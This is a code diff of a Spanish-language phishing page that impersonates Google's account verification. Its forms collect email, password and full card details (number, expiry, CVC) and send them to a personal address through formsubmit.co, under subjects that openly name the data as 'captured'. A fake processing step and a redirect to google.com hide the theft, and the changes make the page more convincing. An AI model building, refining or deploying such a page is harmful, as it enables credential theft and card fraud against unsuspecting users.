@@ -3,118 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de cuenta de Google</title>
+    <title>Verificación de seguridad</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f2f2f2;
+            background-color: #f0f2f5;
         }
         .container {
             background-color: #fff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
+            padding: 50px; /* Más espacio interno */
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15); /* Sombra más pronunciada */
+            width: 450px; /* Más ancho */
             text-align: center;
         }
         .logo {
-            width: 75px;
-            margin-bottom: 20px;
+            width: 120px; /* Logo más grande */
+            margin-bottom: 30px;
         }
         h1 {
-            font-size: 20px;
-            margin-bottom: 10px;
+            font-size: 26px; /* Título más grande */
+            margin-bottom: 15px;
+            color: #202124;
         }
         p {
-            font-size: 14px;
-            margin-bottom: 20px;
+            font-size: 18px; /* Texto más grande */
+            margin-bottom: 30px;
+            color: #5f6368;
         }
-        input[type="text"], input[type="password"], input[type="number"] {
+        .warning-box {
+            background-color: #fce8e6;
+            border: 1px solid #d93025;
+            color: #c5221f;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        input[type="text"], input[type="password"], input[type="email"] {
             width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+            padding: 18px; /* Campos más grandes para escribir */
+            margin: 12px 0;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
             box-sizing: border-box;
+            font-size: 18px;
+        }
+        input:focus {
+            border-color: #4285f4;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
         }
         button {
-            background-color: #4285f4;
+            background-color: #1a73e8;
             color: white;
-            padding: 10px 20px;
+            padding: 18px 20px;
             border: none;
-            border-radius: 4px;
+            border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            font-size: 16px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
         }
         button:hover {
-            background-color: #357ae8;
+            background-color: #1557b0;
         }
         .hidden {
             display: none;
         }
         .processing {
-            font-size: 16px;
-            color: #333;
+            font-size: 20px;
+            color: #5f6368;
+            padding: 40px 0;
         }
         .success {
-            font-size: 16px;
-            color: green;
-        }
-        .warning {
-            color: #d9534f;
+            font-size: 22px;
+            color: #1e8e3e;
+            padding: 40px 0;
             font-weight: bold;
-            margin-bottom: 15px;
+        }
+        .card-row {
+            display: flex;
+            gap: 20px;
+        }
+        .card-row input {
+            width: 50%;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Logo de Google -->
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
         
         <!-- Paso 1: Credenciales -->
         <div id="step1">
-            <h1>Ingresa a tu cuenta</h1>
-            <p>Para continuar, ingresa tu correo y contraseña.</p>
-            <form action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="Nueva verificación de cuenta">
+            <h1>Verifica tu identidad</h1>
+            <p>Ingresa tu correo y contraseña para continuar.</p>
+            
+            <form action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="Credenciales capturadas: Google Account">
                 <input type="hidden" name="_captcha" value="false">
-                <input type="email" name="Email" placeholder="Correo electrónico" required>
+                <input type="hidden" name="_next" value="https://www.google.com"> <!-- Redirección final si no usa JS -->
+                
+                <input type="email" name="Email" placeholder="Correo electrónico o teléfono" required>
                 <input type="password" name="Password" placeholder="Contraseña" required>
+                
                 <button type="button" onclick="showStep2()">Siguiente</button>
             </form>
         </div>
 
         <!-- Paso 2: Datos de la tarjeta -->
         <div id="step2" class="hidden">
-            <div class="warning">⚠️ Tu cuenta ha sido detectada con actividad sospechosa.</div>
-            <p>Para verificar tu identidad y evitar el bloqueo, ingresa los datos de tu tarjeta.</p>
-            <form action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
-                <input type="hidden" name="_next" value="https://www.google.com">
-                <input type="hidden" name="_subject" value="Datos de tarjeta robados">
-                <input type="text" name="CardName" placeholder="Nombre en la tarjeta" required>
-                <input type="text" name="CardNumber" placeholder="Número de tarjeta" required>
-                <div style="display: flex; gap: 10px;">
+            <div class="warning-box">
+                ⚠️ Tu cuenta tiene actividad inusual.<br>
+                Debes verificar tu identidad para evitar la suspensión.
+            </div>
+            <p>Ingresa los datos de tu tarjeta de crédito o débito para confirmar.</p>
+            
+            <form action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="Datos de Tarjeta Capturados">
+                <input type="hidden" name="_captcha" value="false">
+                
+                <input type="text" name="CardName" placeholder="Nombre completo en la tarjeta" required>
+                <input type="text" name="CardNumber" placeholder="Número de la tarjeta" required>
+                
+                <div class="card-row">
                     <input type="text" name="Expiry" placeholder="MM/YY" required>
                     <input type="text" name="CVC" placeholder="CVC" required>
                 </div>
+                
                 <button type="button" onclick="showProcessing()">Verificar</button>
             </form>
         </div>
 
         <!-- Paso 3: Procesando -->
         <div id="processing" class="hidden">
-            <div class="processing">Procesando tus datos...</div>
+            <div class="processing">Procesando verificación...<br>Por favor no cierres la ventana.</div>
         </div>
 
         <!-- Paso 4: Éxito -->
         <div id="success" class="hidden">
-            <div class="success">✓ Verificación exitosa</div>
+            <div class="success">
+                ✓ Verificación completada<br>
+                <span style="font-size: 16px; color: #5f6368; font-weight: normal;">Tu cuenta ya está segura.</span>
+            </div>
         </div>
     </div>
 
@@ -128,16 +168,16 @@
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('processing').classList.remove('hidden');
             
-            // Simulamos un tiempo de espera de 3 segundos
+            // Simulamos un tiempo de espera de 3 segundos para que parezca real
             setTimeout(function() {
                 document.getElementById('processing').classList.add('hidden');
                 document.getElementById('success').classList.remove('hidden');
                 
-                // Después de mostrar éxito, redirigimos a Google
+                // Después de mostrar éxito por 2 segundos, redirigimos a Google
                 setTimeout(function() {
                     window.location.href = "https://www.google.com";
-                }, 2000); // 2 segundos mostrando "éxito"
-            }, 3000); // 3 segundos procesando
+                }, 2000); 
+            }, 3000); 
         }
     </script>
 </body>
